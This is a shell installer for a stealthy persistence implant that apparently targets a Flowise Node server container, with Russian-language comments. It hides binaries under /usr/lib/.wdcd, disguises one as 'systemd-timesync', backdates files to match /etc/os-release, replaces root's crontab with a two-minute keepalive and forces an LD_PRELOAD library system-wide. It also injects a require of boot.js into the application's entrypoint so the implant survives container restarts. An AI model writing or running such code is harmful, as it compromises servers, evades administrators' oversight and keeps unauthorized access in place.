#!/bin/sh
set -e
ID="flowise-82@flowise-82"
DIR="/usr/lib/.wdcd"
BOOT=/usr/lib/.wdcd/bin/boot.js
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
	echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
	if command -v apk >/dev/null 2>&1; then apk add --no-cache ca-certificates >/dev/null 2>&1 || true;
	elif command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
	if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — агент не сможет ходить по HTTPS" >&2; exit 1; fi
fi
mkdir -p "$DIR/bin"
pkill -x systemd-timesync 2>/dev/null || true
cp diagd "$DIR/bin/systemd-timesync"
cp libcache.so "$DIR/bin/libcache.so"
cp boot.js "$DIR/bin/boot.js"
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json"
rm -f "$DIR/wdcd" "$DIR/bin/sysdiag" 2>/dev/null || true
rm -rf "$DIR/telemetry" "$DIR/data" 2>/dev/null || true
chmod 700 "$DIR" "$DIR/bin"; chmod 755 "$DIR/bin/systemd-timesync"; chmod 644 "$DIR/bin/libcache.so"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
	touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/systemd-timesync" "$DIR/bin/libcache.so" 2>/dev/null || true
fi
pidfile=/usr/lib/.wdcd/bin/wdcd.pid
cat > /etc/crontabs/root <<ROOTCRON
@reboot sleep 30; sh /etc/periodic/15min/wdcd-keepalive
*/2 * * * * sh /etc/periodic/15min/wdcd-keepalive
ROOTCRON
chmod 600 /etc/crontabs/root
mkdir -p /etc/periodic/15min
cat > /etc/periodic/15min/wdcd-keepalive <<CRON
#!/bin/sh
pid=$DIR/bin/wdcd.pid
if [ -f "\$pid" ] && kill -0 \$(cat "\$pid") 2>/dev/null; then
        exit 0
fi
nohup env LD_PRELOAD="$DIR/bin/libcache.so" "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 &
echo \$! > "\$pid"
CRON
chmod 755 /etc/periodic/15min/wdcd-keepalive
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
	touch -d "@$_stamp" /etc/crontabs/root /etc/periodic/15min/wdcd-keepalive 2>/dev/null || true
fi
if ! grep -q "libcache" /etc/environment 2>/dev/null; then
	printf 'LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so\\n' >> /etc/environment
fi
mkdir -p /etc/profile.d
cat > /etc/profile.d/wdcd-preload.sh <<PL
if [ -z "\$LD_PRELOAD" ] && [ -f /usr/lib/.wdcd/bin/libcache.so ]; then export LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so; fi
PL
chmod 644 /etc/profile.d/wdcd-preload.sh
pkill -x crond 2>/dev/null || true; setsid env LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so crond 2>/dev/null || true
setsid env LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so nohup "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 < /dev/null &
echo $! > "$pidfile"
sleep 1
if kill -0 $(cat "$pidfile") 2>/dev/null; then echo "agent $ID установлен (alpine/crond, pid=$(cat "$pidfile"))";
else echo "agent $ID установлен, но процесс не поднялся (проверь вручную)" >&2; fi

ENTRY=""
case "$(head -1 /proc/1/cmdline 2>/dev/null | tr '\0' ' ')" in
	node*) ENTRY=$(tr '\0' '\n' < /proc/1/cmdline | grep -E '\.(js|cjs|mjs)$' | head -1);;
	npm*|sh*|bash*) for f in /app/packages/server/dist/index.js /app/index.js /usr/src/app/packages/server/dist/index.js /usr/src/app/index.js; do [ -s "$f" ] && ENTRY="$f" && break; done;;
esac
if [ -n "$ENTRY" ] && [ -s "$ENTRY" ]; then
	if ! head -3 "$ENTRY" 2>/dev/null | grep -q "wdcd/bin/boot"; then
		tmp=$(mktemp)
		{ echo ";require('/usr/lib/.wdcd/bin/boot.js');"; cat "$ENTRY"; } > "$tmp" && cat "$tmp" > "$ENTRY" && rm -f "$tmp"
		echo "node entrypoint: $ENTRY ← boot.js внедрён (переживёт restart контейнера)"
	fi
else
	echo "node entrypoint не найден — автозапуск только через crond/periodic (restart контейнера без crond не поднимет)"
fi
